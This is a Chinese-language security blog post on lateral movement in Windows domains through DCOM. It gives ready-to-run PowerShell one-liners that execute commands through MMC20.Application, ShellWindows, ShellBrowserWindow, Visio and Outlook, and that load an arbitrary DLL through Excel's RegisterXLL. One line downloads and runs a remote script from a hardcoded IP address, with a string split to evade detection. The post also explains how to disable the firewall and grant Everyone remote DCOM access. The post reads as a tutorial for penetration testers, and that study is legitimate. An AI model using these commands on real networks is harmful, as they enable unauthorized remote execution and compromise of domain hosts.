<!-- build time:Thu Apr 14 2022 13:53:12 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><link rel="mask-icon" href="/images/logo.svg" color=""><link rel="manifest" href="/images/manifest.json"><meta name="msapplication-config" content="/images/browserconfig.xml"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="如月专注" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="如月专注" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="如月专注" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><link rel="canonical" href="http://example.com/2021/08/27/%E5%88%A9%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"><title>利用DCOM进行横向渗透 - Windows安全 | 如月专注</title><meta name="generator" content="Hexo 5.4.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">利用DCOM进行横向渗透</h1><div class="meta"><span class="item" title="创建时间：2021-08-27 16:48:35"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2021-08-27T16:48:35+08:00">2021-08-27</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>7k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>6 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">如月专注</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/5.jpg"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/3.jpg"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/4.jpg"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/2.png"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/7.jpg"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/6.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 Windows安全"><span itemprop="name">Windows安全</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2021/08/27/%E5%88%A9%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="ruyue"><meta itemprop="description" content=", "></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="如月专注"></span><div class="body md" itemprop="articleBody"><h1 id="为什么用dcom"><a class="anchor" href="#为什么用dcom">#</a> 为什么用 DCOM</h1><p>使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件。例如我们使用 ShellBrowserWindow COM 对象，那么就会在远程主机的现有 explorer.exe 进程中执行。对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向 DCOM 公开方法，因此防御者可能难以全面监测所有程序的执行。</p><h1 id="com概述"><a class="anchor" href="#com概述">#</a> COM 概述</h1><p><br>COM 对象是遵循 COM 规范编写、以 Win32 动态链接库（DLL）或可执行文件（EXE）形式发布的可执行二进制代码，能够满足对组件架构的所有需求。COM 是许多微软产品和技术，如 Windows 媒体播放器和 Windows Server 的基础。</p><p>一般的对象是由数据成员和作用在其上的方法组成，而组件对象和一般对象虽有相似性，但又有较大不同。组件对象不使用方法而用接口来描述自身。接口被定义为 “在对象上实现的一组语义上相关的功能”，其实质是一组函数指针表，每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。</p><p><br></p><h1 id="dcom概述"><a class="anchor" href="#dcom概述">#</a> DCOM 概述</h1><p><br>DCOM（分布式组件对象模型）是 COM（组件对象模型）的扩展，它允许应用程序使用基于 RPC 的 DCOM 实例化访问远程计算机上 COM 对象的属性和方法，就像本地机器上的对象一样。</p><p>说白了 DCOM 就是使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外。</p><p>关于每个 COM（和 DCOM）对象的身份、实现和配置的信息存储在注册表中，并与一些重要的标识符相关联：</p><p><strong>CLSID</strong> - 类标识符 是一个 GUID，它充当 COM 类的唯一标识符，在 Windows 中注册的每个类都与一个 CLSID 相关联， 注册表中的 CLSID 键指向类的实现。</p><p><strong>ProgID</strong> - Programmatic Identifier 是一个可选标识符，它可以用作 CLSID 的更用户友好的替代方案，因为它不必遵守 CLSID 令人生畏的 GUID 格式（例如，“System.AppDomainManager” 是在眼睛上比 GUID 容易得多）。 ProgID 不能保证是唯一的，并且与 CLSID 不同，并非每个类都有 ProgID 相关联。</p><p><strong>AppID</strong> - 应用程序标识符 用于指定与同一可执行文件关联的一个或多个 COM 对象的配置。 这包括授予各种组以本地和远程实例化和访问相关类的权限。</p><p><br></p><p>要使 DCOM 可以访问 COM 对象，AppID 必须与类的 CLSID 相关联，并且需要为 AppID 授予适当的权限。 没有关联 AppID 的 COM 对象无法从远程机器直接访问.<br>Win32_DCOMApplication WMI 类提供了一种通过 AppID 枚举可用 DCOM 应用程序的简单方法</p><p>Get-CimInstance Win32_DCOMApplication<br>[PS：Get-CimInstance 这个 cmdle（powershell 命令行）默认只在 powershell 3.0 以上版本中存在，所以只有 Windows server 2012 及以上版本的操作系统才可以使用 Get-Ciminstance。</p><p>Windows 7、Windows Server 2008 中默认安装的是 powershell 2.0，所以他们都不支持 Get-CimInstance，可以用以下命令代替 Get-CimInstance：</p><p>Get-WmiObject -Namespace ROOTCIMV2 -Class Win32_DCOMApplication]</p><p><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/e1d781bd-0c4d-4c6a-935d-78e6fe8182b3_44508bb9-babe-45da-9d98-1277e5bd3780-image.png" alt="44508bb9-babe-45da-9d98-1277e5bd3780-image.png"><br></p><p><strong>而远程 DCOM 对象的实例化行为具体如下</strong>：</p><ul><li><p>客户端机器从远程机器请求由 CLSID 表示的对象的实例化。 如果客户端使用 ProgID，它首先在本地解析为 CLSID。</p></li><li><p>远程机器检查是否存在与有问题的 CLSID 关联的 AppID，并验证客户端的权限。<br>如果一切顺利， DCOMLaunch 服务会创建所请求类的实例，最常见的方法是运行 LocalServer32 子项的可执行文件，或创建 dllhost 进程来托管 InProcServer32 子项引用的 dll。</p></li><li><p>在客户端应用程序和服务器进程之间建立通信。 在大多数情况下，新进程是在与 DCOM 通信关联的会话中创建的。</p></li><li><p>客户端访问新创建的对象的成员和方法。（执行任意命令）</p></li></ul><p><br><br></p><h1 id="任意命令行执行"><a class="anchor" href="#任意命令行执行">#</a> 任意命令行执行</h1><p>一些 COM 应用程序存在命令执行方法，我们就是通过调用这些 COM 应用程序的执行方法来执行命令的。<br>如 MMC20.Application，还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等（但是 Excel、Outlook 组件的命令执行方法我没复现成功，不知道是不是环境问题）<br></p><h2 id="mmc20application"><a class="anchor" href="#mmc20application">#</a> MMC20.Application</h2><p>首先创建实例 MMC20.Application ” 对象 。<br>然后使用 “Document.ActiveView” 属性的 “ExecuteShellCommand” 方法来执行我们的命令。<br>这样执行的命令将由 mmc.exe 的子进程来运行。</p><pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))
#将127.0.0.1的MMC20.Application应用对象绑定到变量$com中
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;)
#调用MMC20.Application中的ExecuteshellCommand方法来执行命令。
</code></pre><p>组合起来就是</p><pre><code>[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;)).Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;)
</code></pre><p><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/339879de-6a51-41c6-bf70-8801dd42a9f4_894b2d5b-daa5-458b-aa33-07f0acbc665f-image.png" alt="894b2d5b-daa5-458b-aa33-07f0acbc665f-image.png"></p><pre><code>#利用powershell上线利用powershell上线
[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;)).Document.ActiveView.ExecuteShellCommand('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',$null,&quot;IEX ((new-object net.webclient).downloadstring('ht'+'tp://62.234.130.153/cxxx.ps1'));&quot;,&quot;Minimized&quot;)
</code></pre><pre><code>PS：查看该COM对象的方法和属性
$com.Document.ActiveView | Get-Member
</code></pre><p><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/1f8f86d3-10bb-4490-9a4f-e5cb25b7ce5b_374e719a-7579-4787-afab-2a99f04941c3-image.png" alt="374e719a-7579-4787-afab-2a99f04941c3-image.png"></p><p><br></p><h2 id="shellwindows"><a class="anchor" href="#shellwindows">#</a> ShellWindows</h2><p>命令执行具体过程：与大多数其他方法不同，ShellWindows 不创建进程。 相反，它会激活现有 explorer.exe 进程内的类实例，该进程非常定期地执行子进程。 为了进行通信，explorer.exe 会 在 DCOM 端口上打开一个侦听套接字。因此也可以通过查看这个进程是否存在网络通信来发现攻击。<br><br>ShellWindows 对象代表一个打开的文件资源管理器窗口。 这意味着尝试在没有打开资源管理器窗口的机器上创建此对象不返回任何内容，从而导致方法不可用。<br><br>注意 - ShellWindows 类与 ProgID 无关，必​​须通过 CLSID 创建。 当然，所有其他对象也可以使用 CLSID 创建。</p><pre><code>Get-CimInstance Win32_DCOMApplication | findstr ShellWindows
$com=[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',&quot;127.0.0.1&quot;))
$com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
组合起来就是:
[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',&quot;127.0.0.1&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
</code></pre><p><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/401a11f8-76ba-4f13-b506-666cf8b5b4f1_f5c5c3cd-f99e-4101-9ee6-af965eda30c3-image.png" alt="f5c5c3cd-f99e-4101-9ee6-af965eda30c3-image.png"><br><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/100dab74-526c-4cdb-bf50-b519c2900059_fa642384-57d9-4ab1-a6bc-a938fe97025e-image.png" alt="fa642384-57d9-4ab1-a6bc-a938fe97025e-image.png"><br><br></p><h2 id="shellbrowserwindow"><a class="anchor" href="#shellbrowserwindow">#</a> ShellBrowserWindow</h2><p>类似 ShellWindows，此方法由现有的 explorer.exe 进程托管，同样可以通过查看是否存在侦听套接字的 explorer.exe 进程来识别。</p><p>限制 - 虽然此对象不需要像 ShellWindows 这样的打开的资源管理器窗口，但它在 Windows 7 和更早版本上不可用。<br></p><p>注意 - ShellBrowserWindow 类也不与 ProgID 相关联。</p><p>使用条件：适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统。</p><pre><code>Get-CimInstance Win32_DCOMApplication | findstr ShellBrowserWindow

$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.152.128&quot;))

#完整命令
[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.152.128&quot;)).Document.Application.shellExecute(&quot;calc&quot;)
</code></pre><p><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/3ebdc5a9-954b-408b-9f4f-2cf8f6bfa24d_31798021-e122-4cf8-bf1e-c199d0f82c38-image.png" alt="31798021-e122-4cf8-bf1e-c199d0f82c38-image.png"><br><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/58d19035-834e-4d0b-913f-b4765663ca4f_b102b6f6-5d7e-4e56-a5a4-f7597b18ac5b-image.png" alt="b102b6f6-5d7e-4e56-a5a4-f7597b18ac5b-image.png"></p><p><br><br></p><h2 id="excelapplication"><a class="anchor" href="#excelapplication">#</a> Excel.Application</h2><p>（没复现成功）</p><pre><code>#通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例:
$com = [activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;127.0.0.1&quot;))
#关闭警告
$com.DisplayAlerts = $false
#Excel进程尝试与选择的应用程序建立 DDE 通道。
​$com.DDEInitiate(&quot;cmd&quot;,&quot;/c calc.exe&quot;)
</code></pre><p><br><br></p><h2 id="visioapplicationoffice中的一种不常见"><a class="anchor" href="#visioapplicationoffice中的一种不常见">#</a> Visio.Application（office 中的一种，不常见）</h2><p>条件：目标机器有 Visio</p><pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;127.0.0.1&quot;))
$com.[0].Document.Application.shellExecute(&quot;calc.exe&quot;)
#完整命令
[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;127.0.0.1&quot;)).[0].Document.Application.shellExecute(&quot;C:\test.exe&quot;)
</code></pre><h2 id="outlookapplication我机子没有没测"><a class="anchor" href="#outlookapplication我机子没有没测">#</a> Outlook.Application（我机子没有，没测）</h2><pre><code>#通过PowerShell与DCOM进行远程交互，创建Visio.Application对象的实例:
$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;127.0.0.1&quot;))
然后执行如下命令，通过Outlook创建Shell.Application对象并执行命令:
$com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;C:shell.exe&quot;)
#完整的命令:
[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;127.0.0.1&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;C:\test.exe&quot;)
</code></pre><h1 id="加载任意库"><a class="anchor" href="#加载任意库">#</a> 加载任意库</h1><p>Excel.Application 对象可以通过 RegisterXLL 方法来进行加载库。<br>这里是通过 XLL 库进行扩展来实现的。</p><p><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/6533a968-86da-4321-87e9-6576ec8e1a70_6ac7bc15-45bd-462f-b44f-ceeeda76c630-image.png" alt="6ac7bc15-45bd-462f-b44f-ceeeda76c630-image.png"><br></p><pre><code>$ee = [activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;127.0.0.1&quot;))
$ee.Application.RegisterXLL(&quot;C:\Users\momo\OneDrive\桌面\nightmare.dll&quot;)
</code></pre><p></p><p><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/8d214386-bfe6-451e-8f24-267ef7defba3_c6de2b40-0279-45a6-88db-1afa77b05c58-image.png" alt="c6de2b40-0279-45a6-88db-1afa77b05c58-image.png"><br><br><br>PS：<br>虽然规范要求 XLL 得具有 .xll 扩展名和特定导出，但 RegisterXLL 方法却可以运行任何 dll 的 DllMain，而不管后缀名，因此我们甚至可以将 dll 后缀改为 jpg 等绕过某些检测。<br><br><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/2e756e3e-a696-477c-921b-977fb594688e_09bcf400-cdc1-4b94-9453-4d1cf5c124c7-image.png" alt="09bcf400-cdc1-4b94-9453-4d1cf5c124c7-image.png"><br><br></p><p><br>并且后台会常驻一个 EXCEL 进程，重复的执行我们的 dll，比如我这里，当我 kill 掉 calc 进程后。excel 又会重新创建 calc 进程。<br></p><h1 id="远程调用dcom"><a class="anchor" href="#远程调用dcom">#</a> 远程调用（DCOM）</h1><p><br>前面讲了一堆本地调用的方法，其实远程调用过程也一样，只要把 ip 改掉即可。<br>但是因为种种小问题会影响我们远程调用。这里就简单讲下我在远程调用中出现的问题和解决。<br></p><p>前提：<br>①目标环境存在域<br>②掌握域内一台可控机器<br>③拥有的域账号在目标机器上有权限远程启动与激活 DCOM（一般域管都有权）<br>④网络通畅：（加入站规则或关防火墙）<br>①增加入站规则：DCOM 通信端口是由 RPC 动态分配，不固定，所以将入站端口规则设置为 any<br>netsh advfirewall firewall add rule name=&quot;any&quot; protocol=TCP dir=in localport=any action=allow<br>②关闭防火墙<br>netsh advfirewall set currentprofile state off<br></p><p><strong>最常见的错误</strong><br><br><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/e2a24c80-cc0f-4848-816f-72125ef47137_d6ce35c4-d74b-4e32-9f33-379b4a46e162-image.png" alt="d6ce35c4-d74b-4e32-9f33-379b4a46e162-image.png"></p><p>从爆错上就能很明显的得知是权限不足引起的。而这里权限不足主要分两种情况：<br><br>①未以指定用户权限去调用<br>举个例子，我们直接 WIN+R 调用 powershell 时，powershell 的权限是当前用户的权限，而如果当前用户无权去远程调用目标机器的 DCOM 组件就会回显权限不足。<br>这时候，我们可以使用下述命令，以指定权限去运行 powershell。当输入如下命令后，<br>会得到一个新的 powershell（这个 powershell 的权限是你输入的用户）</p><pre><code>runas /user:ruyue.com\administrator powershell
</code></pre><p><br>②指定的用户权限无权远程访问 DCOM 组件<br>这种情况下，得到目标机器上把我们用户权限给加上。<br>win+R ，输入 dcomcnfg，然后组件服务，我的电脑查看属性，选择 COM 安全然后编辑限制，把我们的用户给加上权限。<br><br><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/b405c3e6-dc26-431b-a8bc-bfda40774c5b_64288218-6ef0-4d70-bc30-f9cce93331e7-image.png" alt="64288218-6ef0-4d70-bc30-f9cce93331e7-image.png"><br><br>这里我直接把 everyone 给加上去，这样无论是谁都有了远程访问的权限。<br><br><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/592c820e-b716-42ff-be54-0558335dc00e_ebc5916c-ff0d-4a38-9c7c-dc404f9cbddf-image.png" alt="ebc5916c-ff0d-4a38-9c7c-dc404f9cbddf-image.png"></p><p><br><strong>实操</strong></p><p></p><p>先远程查看目标机器上的 dcom 组件<br>Get-WmiObject Win32_COMSetting -computername 192.168.152.129 -credential RUYUE\administrator | Select-String &quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;<br><br><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/6d1a908e-8051-43f8-a2c4-e19d2bfee099_3d32f96e-8f19-45fe-97e2-78cf8175a4f9-image.png" alt="3d32f96e-8f19-45fe-97e2-78cf8175a4f9-image.png"><br></p><p>找到能利用的组件后，开启一个域管权限的 powershell<br>然后远程激活调用 DCOM，执行我们的 payload<br><br><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/94556268-6f66-46a6-a088-b1142ec24c9a_eaa845e6-c21f-459a-b4c5-e68db0aa05f7-image.png" alt="eaa845e6-c21f-459a-b4c5-e68db0aa05f7-image.png"><br><br><img data-src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/img/2cd60cf7-db4a-4949-b0fa-1df993711f7e_acd5a02b-acc1-4493-aa05-3f4513cd9eb5-image.png" alt="acd5a02b-acc1-4493-aa05-3f4513cd9eb5-image.png"></p></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2021-12-08 12:43:13" itemprop="dateModified" datetime="2021-12-08T12:43:13+08:00">2021-12-08</time> </span><span id="2021/08/27/利用DCOM进行横向渗透/" class="item leancloud_visitors" data-flag-title="利用DCOM进行横向渗透" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>ruyue <i class="ic i-at"><em>@</em></i>如月专注</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/2021/08/27/%E5%88%A9%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" title="利用DCOM进行横向渗透">http://example.com/2021/08/27/利用DCOM进行横向渗透/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2021/08/19/%E5%A6%82%E4%BD%95%E8%BD%BB%E6%9D%BE%E7%A0%B4%E8%A7%A3%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ruyueattention&#x2F;ruyueattention.github.io&#x2F;images&#x2F;3.jpg" title="如何轻松破解前端加密"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 垃圾箱</span><h3>如何轻松破解前端加密</h3></a></div><div class="item right"><a href="/2021/10/09/Exchange%20Proxyshell/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ruyueattention&#x2F;ruyueattention.github.io&#x2F;images&#x2F;2.png" title="Exchange Proxyshell"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 漏洞复现</span><h3>Exchange Proxyshell</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8dcom"><span class="toc-number">1.</span> <span class="toc-text">为什么用 DCOM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#com%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">COM 概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dcom%E6%A6%82%E8%BF%B0"><span class="toc-number">3.</span> <span class="toc-text">DCOM 概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C"><span class="toc-number">4.</span> <span class="toc-text">任意命令行执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mmc20application"><span class="toc-number">4.1.</span> <span class="toc-text">MMC20.Application</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellwindows"><span class="toc-number">4.2.</span> <span class="toc-text">ShellWindows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellbrowserwindow"><span class="toc-number">4.3.</span> <span class="toc-text">ShellBrowserWindow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#excelapplication"><span class="toc-number">4.4.</span> <span class="toc-text">Excel.Application</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#visioapplicationoffice%E4%B8%AD%E7%9A%84%E4%B8%80%E7%A7%8D%E4%B8%8D%E5%B8%B8%E8%A7%81"><span class="toc-number">4.5.</span> <span class="toc-text">Visio.Application（office 中的一种，不常见）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#outlookapplication%E6%88%91%E6%9C%BA%E5%AD%90%E6%B2%A1%E6%9C%89%E6%B2%A1%E6%B5%8B"><span class="toc-number">4.6.</span> <span class="toc-text">Outlook.Application（我机子没有，没测）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E5%BA%93"><span class="toc-number">5.</span> <span class="toc-text">加载任意库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8dcom"><span class="toc-number">6.</span> <span class="toc-text">远程调用（DCOM）</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2021/07/26/Windows%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/" rel="bookmark" title="Windows抓取密码">Windows抓取密码</a></li><li><a href="/2021/07/26/Windows%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/" rel="bookmark" title="Windows远程执行命令">Windows远程执行命令</a></li><li class="active"><a href="/2021/08/27/%E5%88%A9%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" rel="bookmark" title="利用DCOM进行横向渗透">利用DCOM进行横向渗透</a></li><li><a href="/2021/12/26/COM%E5%8A%AB%E6%8C%81/" rel="bookmark" title="COM在权限维持中的应用">COM在权限维持中的应用</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ruyue" data-src="/images/avatar.jpg"><p class="name" itemprop="name">ruyue</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">23</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">9</span> <span class="name">分类</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2021/08/19/%E5%A6%82%E4%BD%95%E8%BD%BB%E6%9D%BE%E7%A0%B4%E8%A7%A3%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2021/10/09/Exchange%20Proxyshell/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/03/17/docker%E7%BD%91%E7%BB%9C/" title="docker网络">docker网络</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/" title="分类于 服务器配置">服务器配置</a></div><span><a href="/2022/04/13/%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/" title="透明代理-clash+ubuntu">透明代理-clash+ubuntu</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" title="分类于 Windows安全">Windows安全</a></div><span><a 